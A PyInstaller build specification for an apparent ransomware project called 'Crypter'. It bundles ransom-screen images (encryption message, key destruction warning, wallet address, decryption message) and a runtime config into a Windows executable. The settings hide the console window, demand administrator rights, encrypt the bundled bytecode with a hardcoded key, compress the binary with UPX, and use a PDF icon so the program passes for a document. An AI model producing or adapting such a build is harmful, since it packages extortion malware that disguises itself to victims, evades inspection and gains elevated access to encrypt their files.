# -*- mode: python -*-

block_cipher = pyi_crypto.PyiBlockCipher(key='0123456789ABCDEF')


a = Analysis(['..\\Crypter\\Main.py'],
             pathex=['.\\build'],
             binaries=[],
             datas=[("Resources/crypter_title.bmp", "."),
		    ("Resources/crypter_logo_small.bmp", "."),
		    ("Resources/encrypt_message.bmp", "."),
		    ("Resources/key_destruction.bmp", "."),
		    ("Resources/wallet_address.bmp", "."),
		    ("Resources/decrypt_message.bmp", "."),
			("Resources/runtime.cfg", ".")],
             hiddenimports=[],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name='Main',
          debug=False,
          strip=False,
          upx=True,
          console=False , uac_admin=True, icon='pdf.ico')
